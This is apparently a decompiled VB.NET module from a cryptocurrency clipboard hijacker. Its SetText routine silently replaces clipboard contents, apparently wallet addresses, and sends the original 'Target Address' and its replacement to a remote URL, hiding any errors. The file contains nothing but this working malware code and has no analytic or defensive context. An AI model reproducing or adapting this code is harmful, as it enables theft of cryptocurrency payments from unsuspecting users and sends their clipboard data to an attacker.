Imports System
Imports System.IO
Imports System.Net
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace Crypto.Crypto
	' Token: 0x0200000E RID: 14
	Friend Module Clipboard
		' Token: 0x06000030 RID: 48 RVA: 0x00002AB8 File Offset: 0x00000CB8
		Public Function GetText() As String
			Dim ReturnValue As String = String.Empty
			Dim thread As Thread = New Thread(Sub()
												  ReturnValue = Clipboard.GetText()
											  End Sub)
			thread.SetApartmentState(ApartmentState.STA)
			thread.Start()
			thread.Join()
			Return ReturnValue
		End Function

		' Token: 0x06000031 RID: 49 RVA: 0x00002B0C File Offset: 0x00000D0C
		Public Sub SetText(txt As String)
			Dim thread As Thread = New Thread(Sub()
												  Try
													  Dim requestUriString As String = String.Concat(New String() {Addresses.url, "?Target Address : ", Clipboard.GetText(), " | Changed With : ", txt})
													  Clipboard.SetText(txt)
													  Dim webRequest As WebRequest = WebRequest.Create(requestUriString)
													  Dim response As WebResponse = webRequest.GetResponse()
													  Dim responseStream As Stream = response.GetResponseStream()
													  Dim streamReader As StreamReader = New StreamReader(responseStream)
													  Dim text As String = streamReader.ReadToEnd()
													  streamReader.Close()
													  response.Close()
												  Catch ex As Exception
												  End Try
											  End Sub)
			thread.SetApartmentState(ApartmentState.STA)
			thread.Start()
			thread.Join()
		End Sub
	End Module
End Namespace
